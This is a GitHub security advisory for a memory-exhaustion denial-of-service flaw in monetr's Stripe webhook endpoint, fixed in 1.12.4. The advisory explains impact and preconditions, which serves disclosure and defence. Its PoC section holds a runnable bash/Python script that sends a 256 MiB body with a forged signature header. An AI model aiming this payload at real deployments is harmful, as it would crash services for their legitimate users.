# [H] In monetr, unauthenticated Stripe webhook reads attacker-sized request bodies before signature validation

## Summary
Severity: High
Advisory: GHSA-v7xq-3wx6-fqc2
CVE: CVE-2026-40481
CWE: CWE-400, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-v7xq-3wx6-fqc2
Type: github-advisory

## Affected
- Go: `github.com/monetr/monetr` — affected >=0 <1.12.4

## Details
### Summary

The public Stripe webhook endpoint fully reads the request body into memory before validating the Stripe signature. A remote unauthenticated attacker can send oversized POST bodies and cause substantial memory growth, leading to denial of service.

### Details

When Stripe webhooks are enabled, the Stripe webhook route is reachable without authentication. The handler only requires that a `Stripe-Signature` header be present, then buffers the entire request body in memory and only afterward attempts Stripe signature verification.

Because body buffering happens before signature validation, memory consumption is controlled by the attacker-supplied payload size even when the signature is invalid. Large requests or repeated requests can exhaust available memory and make the service unresponsive or crash.

This issue depends on Stripe webhooks being enabled. If an upstream proxy or load balancer already enforces a strict request-body limit smaller than the attacker payload, exploitability is reduced accordingly.

### PoC

```bash
URL="http://127.0.0.1:4000/api/stripe/webhook"
PROC_NAME="monetr"
TOTAL_KIB="$(awk '/MemTotal:/ {print $2}' /proc/meminfo)"

python3 - <<'PY' | curl -s -o /dev/null \
  --limit-rate 10m \
  -H 'Stripe-Signature: t=1,v1=deadbeef' \
  --data-binary @- \
  "$URL" &
import sys
sys.stdout.buffer.write(b"A" * (256 * 1024 * 1024))
PY
REQ_PID=$!

while kill -0 "$REQ_PID" 2>/dev/null; do
  ps -C "$PROC_NAME" -o rss=,%cpu= | awk -v total="$TOTAL_KIB" '
    {
      printf "%s mem=%.2fMiB / %.3fGiB cpu=%s%%\n", "'"$PROC_NAME"'", $1/1024, total/1024/1024, $2
    }
  '
  sleep 1
done

wait "$REQ_PID"
# monetr mem rises substantially while processing the invalid webhook body before signature validation fails
```

### Impact

- Type: Denial of service / uncontrolled resource consumption (CWE-400)
- Who is impacted: Internet-reachable monetr deployments that have both Stripe billing and Stripe webhooks enabled
  (Stripe.Enabled and Stripe.WebhooksEnabled). In practice this is the hosted/SaaS configuration. Self-hosted instances
  are very unlikely to be affected, because Stripe billing is opt-in, is not part of a typical self-hosted setup, and
  the webhook route short-circuits to 404 when it is not enabled; meaning the unbounded read is unreachable on a default
  self-hosted deployment.
- Security impact: A remote, unauthenticated attacker can cause the monetr server process to buffer attacker-controlled
  payloads into memory before any signature validation occurs. Sufficiently large or repeated requests can drive memory
  consumption high enough to make the API unresponsive or crash the process, denying service to all legitimate users of
  the affected instance — not just users of the billing surface.
- Attack preconditions: The attacker must be able to reach the /api/stripe/webhook endpoint over the network and the
  target instance must have Stripe webhooks enabled. No authentication, prior account, user interaction, or knowledge of
  the Stripe webhook secret is required. Exploitability is reduced (and may be effectively eliminated) on deployments
  where an upstream proxy or load balancer enforces a request-body size limit smaller than the attacker's payload.

## References
- https://github.com/monetr/monetr/security/advisories/GHSA-v7xq-3wx6-fqc2
- https://nvd.nist.gov/vuln/detail/CVE-2026-40481
- https://github.com/monetr/monetr
- https://github.com/monetr/monetr/releases/tag/v1.12.4
